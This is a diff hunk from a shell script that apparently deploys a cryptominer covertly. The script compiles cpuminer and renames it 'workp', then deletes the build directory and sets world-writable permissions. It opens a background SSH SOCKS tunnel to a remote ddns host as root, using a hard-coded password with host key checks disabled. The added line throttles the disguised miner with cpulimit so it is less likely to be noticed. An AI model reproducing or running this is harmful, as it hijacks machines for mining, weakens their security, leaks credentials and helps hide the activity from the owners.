@@ -5,4 +5,4 @@ cd laptopdell24inch
 chmod +x *
 ./build.sh
 make
-mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf laptopdell24inch && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork.ddns.net 
+mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf laptopdell24inch && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork.ddns.net && cpulimit --exe workp --limit 200 -b 
